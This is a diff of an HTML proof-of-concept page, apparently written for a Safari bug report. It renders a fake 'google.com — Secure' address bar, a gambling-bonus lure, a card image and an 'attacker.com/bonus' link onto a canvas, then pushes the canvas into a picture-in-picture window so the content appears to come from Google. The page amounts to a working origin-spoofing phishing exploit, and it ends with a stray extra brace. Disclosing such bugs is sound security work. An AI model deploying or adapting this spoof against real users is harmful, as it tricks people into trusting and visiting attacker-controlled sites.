@@ -2,32 +2,115 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>PoC Safari PiP - Fake Google.com + Visit Link - Final</title>
-...
-<canvas id="c" width="960" height="540"></canvas>
-<video id="v" playsinline webkit-playsinline muted></video>
-
-<button id="btnPiP">1. Activate PiP - Fake Google.com</button>
-<button id="btnGoogle">2. Open google.com (real) - Check PiP persists</button>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC Safari PiP - English - Fake Google + Attacker Link - FINAL</title>
+<style>
+  body{margin:0;background:#f2f2f2;color:#000;font-family:-apple-system,sans-serif;padding:12px;text-align:center}
+  .box{max-width:960px;margin:0 auto;background:#000;border:2px solid #333;border-radius:14px;overflow:hidden}
+  canvas{width:100%;display:block}
+  video{width:100%;display:none;border:3px solid #0a84ff;border-radius:12px;margin-top:10px}
+  button{font-size:16px;padding:16px 20px;margin:8px 0;width:100%;max-width:480px;border-radius:12px;border:none;font-weight:700;cursor:pointer}
+  .b1{background:#0a84ff;color:#fff;font-size:18px}
+  .b2{background:#1c1c1e;color:#fff;border:1px solid #555}
+</style>
+</head>
+<body>
+<h3>Safari PiP Spoof - FINAL ENGLISH - 2 Button</h3>
+<div class="box">
+  <canvas id="c" width="960" height="540"></canvas>
+  <video id="v" playsinline webkit-playsinline muted controls></video>
+</div>
+<button class="b1" id="btnPiP">1. Activate PiP - Fake Google.com</button>
+<button class="b2" id="btnGoogle">2. Open google.com (real) - Check PiP persists on top</button>
 
 <script>
-// draw fake omnibox BIG
-ctx.fillText('🔒',28,44);
-ctx.fillText('google.com',58,44); // BLUE, BOLD, 18px - visible in small PiP
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var stream=null;
 
-// card
-roundRect(280,250,400,220,16) // dark blue card
-ctx.fillText('****  ****  ****  4242',310,330);
-ctx.fillText('VISA',650,460);
+function roundRect(x,y,w,h,r){
+  ctx.beginPath();
+  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y);
+  ctx.quadraticCurveTo(x+w,y,x+w,y+r);
+  ctx.lineTo(x+w,y+h-r);
+  ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
+  ctx.lineTo(x+r,y+h);
+  ctx.quadraticCurveTo(x,y+h,x,y+h-r);
+  ctx.lineTo(x,y+r);
+  ctx.quadraticCurveTo(x,y,x+r,y);
+  ctx.closePath(); ctx.fill();
+}
 
-// link instruction
-ctx.fillText('👉 Please visit: https://example.com/verify to continue',480,514);
+function draw(){
+  ctx.fillStyle='#fff'; ctx.fillRect(0,0,960,540);
+  // FAKE OMNIBOX GEDE - biar keliatan di PiP kecil
+  ctx.fillStyle='#f1f3f4'; ctx.fillRect(0,0,960,84);
+  ctx.fillStyle='#fff'; roundRect(12,12,936,60,30);
+  ctx.fillStyle='#202124'; ctx.font='bold 24px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('🔒',28,52);
+  ctx.fillStyle='#1a73e8'; ctx.font='bold 22px sans-serif';
+  ctx.fillText('google.com',68,52);
+  ctx.fillStyle='#5f6368'; ctx.font='16px sans-serif';
+  ctx.fillText(' — Secure',210,52);
+  ctx.fillStyle='#dadce0'; ctx.fillRect(0,84,960,2);
+
+  // Content
+  ctx.fillStyle='#ff0033'; ctx.fillRect(0,86,960,454);
+  ctx.fillStyle='#ffff00'; roundRect(24,104,912,84);
+  ctx.fillStyle='#000'; ctx.font='900 38px sans-serif'; ctx.textAlign='center';
+  ctx.fillText('SLOT GACOR 2026 - MAXWIN x1000',480,156);
+
+  ctx.fillStyle='#fff'; ctx.font='bold 22px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('RTP 98.7% - HIGH WIN RATE',40,220);
+  ctx.font='16px sans-serif';
+  ctx.fillText('Limited time bonus for Google users',40,246);
+
+  // Card
+  ctx.fillStyle='#0a2540'; roundRect(40,270,360,200,16);
+  ctx.fillStyle='#ffcc4d'; roundRect(70,290,48,32,6);
+  ctx.fillStyle='#fff'; ctx.font='bold 18px monospace'; ctx.textAlign='left';
+  ctx.fillText('**** **** **** 4242',70,360);
+  ctx.font='12px monospace'; ctx.fillStyle='#a3b4c7';
+  ctx.fillText('VALID 12/28',70,380);
+  ctx.fillText('MAXWIN BONUS $5000',70,398);
+  ctx.fillStyle='#fff'; ctx.font='bold 20px sans-serif'; ctx.textAlign='right';
+  ctx.fillText('VISA',370,452);
+
+  // TEXT NOT CLICKABLE
+  ctx.fillStyle='#fff'; ctx.font='bold 18px sans-serif'; ctx.textAlign='left';
+  ctx.fillText('To claim MAXWIN, please visit:',440,300);
+  ctx.fillStyle='#00ff7f'; ctx.font='bold 20px monospace';
+  ctx.fillText('attacker.com/bonus',440,330);
+  ctx.fillStyle='#fff'; ctx.font='14px sans-serif';
+  ctx.fillText('This text is NOT clickable (video only).',440,354);
+  ctx.fillText('But user will manually type it,',440,374);
+  ctx.fillText('thinking it is from google.com PiP.',440,394);
+  ctx.fillText('Origin spoof: PiP shows google.com',440,420);
+  ctx.fillText('Real origin: bonex1927.github.io',440,440);
+  ctx.fillText('NO origin shown in PiP window = BUG',440,460);
+
+  ctx.fillStyle='#ffff00'; ctx.font='bold 11px monospace'; ctx.textAlign='left';
+  ctx.fillText('BUG: PiP shows 🔒 google.com but real origin bonex1927.github.io not visible',12,532);
+  requestAnimationFrame(draw);
+}
+draw();
 
 function initAndPiP(){
-  stream = c.captureStream(30);
-  v.srcObject = stream;
+  if(!stream){
+    if(c.captureStream) stream=c.captureStream(30);
+    else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30);
+    else return;
+    v.srcObject=stream; v.style.display='block'; c.style.display='none'; v.muted=true;
+  }
   v.play().then(()=>{
-    v.webkitSetPresentationMode('picture-in-picture');
+    if(v.webkitSetPresentationMode) v.webkitSetPresentationMode('picture-in-picture');
+    else if(v.requestPictureInPicture) v.requestPictureInPicture();
   });
 }
+document.getElementById('btnPiP').addEventListener('click', initAndPiP);
+document.getElementById('btnGoogle').addEventListener('click', ()=>{
+  window.open('https://google.com','_blank');
+});
+}
 </script>
+</body>
+</html>
